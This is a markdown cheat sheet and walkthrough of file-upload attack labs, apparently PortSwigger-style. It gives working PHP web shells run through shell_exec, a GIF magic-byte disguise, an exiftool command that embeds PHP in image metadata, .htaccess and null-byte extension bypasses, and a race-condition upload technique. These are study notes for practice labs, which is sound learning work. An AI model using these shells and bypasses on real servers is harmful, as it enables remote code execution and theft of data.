# File Uploads - CHEATSHEET + LABS

## Walkthrough - Most Important Labs
- [upload-.htaccess](#upload-htaccess)
- [php-code-metadadata-exiftool](#php-code-metadadata-exiftool)
- [webshell-race-condition](#webshell-race-condition)


## Methodology

- [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

```bash

- Content-Type: image/jpeg
- Doesn't interpret PHP? -> path traversal to directory that interpreter php. e.g -> filename=..%2fcmd.php
- not php allowed? 
	  -> upload .htaccess
	  -> inject php in metadata with exiftool
- only png allowed? -> add nullbyte -> upload cmd.php%00.png
- Is the server slow to upload images  ? -> race condition
```

## Cheat Sheet

```php

application/x-php

// basic php web shell
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
// add a magick number 
GIF8; 
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
// add php code in image metadata 
exiftool foto.jpg -Comment='<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>' -o cmd.php




<?php echo file_get_contents('/home/carlos/secret'); ?>

```


---

## upload-.htaccess

<br>

> .htaccess → A configuration file used by the Apache HTTP Server.
> It allows you to adjust settings at the directory level, without modifying the main httpd.conf file.

```php
// Example of a .htaccess file used to override default MIME-type behaviour
filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .FOO
filename="cmd.FOO" 
```


![Screenshoot1](../../04-Screenshots/htaccess1.png)


We add a custom file extension that the server will interpret php


![Screenshoot2](../../04-Screenshots/htaccess2.png)

After defining this custom extension, we upload a file using it so that the server processes it according to the newly assigned type.


![Screenshoot3](../../04-Screenshots/htaccess3.png)

<br>

## php-code-metadadata-exiftool

<br>

We embed PHP code within the metadata of an image file, and the resulting output is a file that the server may process according to its metadata configuratio


![Screenshoot4](../../04-Screenshots/exiftool1.png)


Even if the file uses a .php extension, it may still be interpreted by certain tools or systems as a JPEG due to its magic numbers, which define the actual file type.


![Screenshoot5](../../04-Screenshots/exiftool2.png)



![Screenshoot6](../../04-Screenshots/exiftool3.png)

<br>

## webshell-race-condition

<br>

In this lab, we observe that the server takes some time to validate whether the file extension is valid or not.

From this behaviour, we can deduce that there is a brief time window during which our file is stored on the server. After the validation process determines that the file is not of an allowed format, the server deletes it.

We can take advantage of this short window of time by triggering a race condition, sending two requests in parallel:

1: Upload our web shell

2: Send a request to the web shell before it gets removed


![Screenshoot7](../../04-Screenshots/race-web1.png)


![Screenshoot8](../../04-Screenshots/race-web2.png)
